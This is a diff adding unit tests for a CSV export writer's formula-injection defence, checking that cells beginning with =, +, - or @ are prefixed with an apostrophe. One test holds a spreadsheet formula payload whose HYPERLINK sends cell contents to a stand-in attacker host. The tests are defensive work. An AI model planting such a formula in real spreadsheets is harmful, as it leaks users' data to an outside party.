@@ -1,5 +1,5 @@
 import { csvRecords, parseCsv } from './parse-csv';
-import { toCsv, withBom } from './to-csv';
+import { safeSpreadsheetCell, toCsv, withBom } from './to-csv';
 
 /**
  * CSV underpins both the §2.14 result exports and the §2.10 student import, so
@@ -32,6 +32,36 @@ describe('toCsv (export writer, §2.14)', () => {
 
   it('prefixes a UTF-8 BOM so Excel detects the encoding', () => {
     expect(withBom('a,b')).toBe('﻿a,b');
+  });
+
+  it('turns a formula in a name into plain text', () => {
+    const attack = '=HYPERLINK("http://evil.test?x="&A1,"Click")';
+    const [, cell] = toCsv(['name'], [[attack]]).split('\r\n');
+    expect(cell).toBe(`"'=HYPERLINK(""http://evil.test?x=""&A1,""Click"")"`);
+    expect(parseCsv(`name\r\n${cell}`)[1][0]).toBe(`'${attack}`);
+  });
+
+  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '\t=1+1', '\r=1+1', '  =1+1'])(
+    'neutralises %j',
+    (value) => {
+      expect(safeSpreadsheetCell(value)).toBe(`'${value}`);
+    },
+  );
+
+  it('leaves numbers and ordinary text alone', () => {
+    expect(toCsv(['n'], [[-5]])).toBe('n\r\n-5');
+    expect(toCsv(['n'], [['-5']])).toBe('n\r\n-5');
+    expect(toCsv(['n'], [['-12.50']])).toBe('n\r\n-12.50');
+    expect(toCsv(['n'], [['+91']])).toBe('n\r\n+91');
+    expect(toCsv(['n'], [['2026-11-01']])).toBe('n\r\n2026-11-01');
+    expect(toCsv(['n'], [['a@b.io']])).toBe('n\r\na@b.io');
+    expect(toCsv(['n'], [["O'Brien"]])).toBe("n\r\nO'Brien");
+    expect(safeSpreadsheetCell(null)).toBeNull();
+    expect(safeSpreadsheetCell(true)).toBe(true);
+  });
+
+  it('quotes a semicolon so a locale that splits on it keeps one cell', () => {
+    expect(toCsv(['n'], [['a;=1+1']])).toBe('n\r\n"a;=1+1"');
   });
 });
 
